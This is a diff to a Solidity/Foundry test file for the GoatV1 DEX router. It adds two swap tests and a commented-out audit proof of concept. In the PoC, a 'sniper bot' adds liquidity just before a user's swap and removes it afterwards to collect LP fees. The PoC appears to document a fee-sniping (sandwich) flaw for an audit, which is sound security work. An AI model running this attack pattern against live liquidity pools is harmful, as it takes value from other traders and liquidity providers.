@@ -1776,4 +1776,160 @@ contract GoatV1RouterTest is BaseTest {
 
         assertEq(output[0], expectedAmountIn);
     }
+
+    function testSwapTokensToExactTokensInPresaleWethIn() public {
+        // WETH -> Token
+        _addLiquidityWithoutWeth();
+        GoatV1Pair pair = GoatV1Pair(factory.getPool(address(token)));
+
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(token);
+        uint256 amountOut = 300e18;
+        uint256[] memory amounts = router.getAmountsIn(amountOut, path);
+        console2.log("Amounts in: ", amounts[0]);
+        weth.transfer(swapper, amounts[0]);
+        vm.startPrank(swapper);
+
+        weth.approve(address(router), amounts[0]);
+
+        uint256[] memory amountsOut = router.swapTokensForExactTokens(
+            amounts[1], // amountOut
+            amounts[0], // amountInMax
+            path,
+            swapper,
+            block.timestamp
+        );
+        vm.stopPrank();
+        assertGe(amountsOut[1], amountOut);
+    }
+
+    function testSwapTokensToExactTokensInPresaleTokenIn() public {
+        // WETH -> Token
+        _addLiquidityWithoutWeth();
+        _swapWethToToken();
+
+        GoatV1Pair pair = GoatV1Pair(factory.getPool(address(token)));
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uint256 amountOut = 3e18;
+        uint256[] memory amounts = router.getAmountsIn(amountOut, path);
+        amounts[0] += 10e18;
+        console2.log("Amounts in: ", amounts[0]);
+
+        vm.startPrank(swapper);
+
+        token.approve(address(router), amounts[0]);
+
+        uint256[] memory amountsOut = router.swapTokensForExactTokens(
+            amounts[1], // amountOut
+            amounts[0], // amountInMax
+            path,
+            swapper,
+            block.timestamp
+        );
+        vm.stopPrank();
+        assertGe(amountsOut[1], amountOut);
+    }
+
+    // ********************************AUDIT POC's*******************************
+    // struct SnipeVars {
+    //     address sniperBot;
+    //     uint256 balanceWethBefore;
+    //     uint256 balanceTokenBefore;
+    //     uint256 liquidity;
+    //     uint256 earned;
+    //     uint256 balanceWethAfter;
+    //     uint256 balanceTokenAfter;
+    // }
+
+    // function testSnipingLpFeesOnAmm() public {
+    //     SnipeVars memory vars;
+    //     // Setting up the test
+    //     _addLiquidityAndConvertToAmm();
+    //     GoatV1Pair pair = GoatV1Pair(factory.getPool(address(token)));
+    //     weth.transfer(swapper, 5e18);
+
+    //     vm.startPrank(swapper);
+    //     weth.approve(address(router), type(uint256).max);
+    //     router.swapExactWethForTokens(5e18, 0, address(token), swapper, block.timestamp);
+    //     vm.stopPrank();
+
+    //     vm.warp(block.timestamp + 2 days);
+
+    //     vars.sniperBot = makeAddr("sniper-bot");
+
+    //     vm.startPrank(vars.sniperBot);
+
+    //     // Funding bot
+    //     vm.deal(vars.sniperBot, 200 ether);
+    //     weth.deposit{value: 200 ether}();
+    //     token.mint(vars.sniperBot, 200 ether);
+
+    //     weth.approve(address(router), type(uint256).max);
+    //     token.approve(address(router), type(uint256).max);
+
+    //     // Adding liquidity front-running swap
+    //     // The bigger the swap, the more profitable
+
+    //     vars.balanceWethBefore = weth.balanceOf(vars.sniperBot);
+    //     vars.balanceTokenBefore = token.balanceOf(vars.sniperBot);
+
+    //     vars.liquidity = 0;
+    //     {
+    //         uint256 supply = pair.totalSupply();
+    //         uint256 maxValue = (supply / 2 days) - 1;
+    //         (uint256 wethReserve, uint256 tokenReserve) = pair.getReserves();
+
+    //         uint256 wethToAdd = maxValue * wethReserve / supply;
+    //         uint256 tokenToAdd = GoatLibrary.quote(wethToAdd, wethReserve, tokenReserve);
+
+    //         GoatTypes.InitParams memory initParams = GoatTypes.InitParams(0, 0, 0, 0);
+    //         for (uint256 i = 0; i < 100; ++i) {
+    //             (,, uint256 liquidityAdded) = router.addLiquidity(
+    //                 address(token), tokenToAdd, wethToAdd, 0, 0, vars.sniperBot, block.timestamp, initParams
+    //             );
+
+    //             vars.liquidity += liquidityAdded;
+    //         }
+    //     }
+    //     vm.stopPrank();
+
+    //     // Sandwiched swap
+    //     vm.startPrank(swapper);
+    //     token.approve(address(router), 5e18);
+    //     router.swapExactTokensForWeth(
+    //         5e18,
+    //         0, // no slippage protection for now
+    //         address(token),
+    //         swapper,
+    //         block.timestamp
+    //     );
+    //     vm.stopPrank();
+
+    //     // Remove liquidity back-running swap
+    //     vm.startPrank(vars.sniperBot);
+
+    //     pair.approve(address(router), vars.liquidity);
+    //     router.removeLiquidity(address(token), vars.liquidity, 0, 0, vars.sniperBot, block.timestamp);
+    //     vars.earned = pair.earned(vars.sniperBot);
+    //     pair.withdrawFees(vars.sniperBot);
+
+    //     vm.stopPrank();
+
+    //     vars.balanceWethAfter = weth.balanceOf(vars.sniperBot);
+    //     vars.balanceTokenAfter = token.balanceOf(vars.sniperBot);
+
+    //     assert(vars.earned > 0);
+    //     console2.log("Earned: ", vars.earned);
+    //     /*
+    //      The following two checks depend on the direction the sandwiched swap was made.
+    //      Because of impermanent loss, the sniper bot will remove liquidity and have a different
+    //      tokens proportion. If the bot swaps the excedent, it will recover its initial funds + profit.
+    //      */
+    //     // assert(balanceWethAfter > balanceWethBefore);
+    //     assert(vars.balanceTokenAfter > vars.balanceTokenBefore);
+    // }
 }
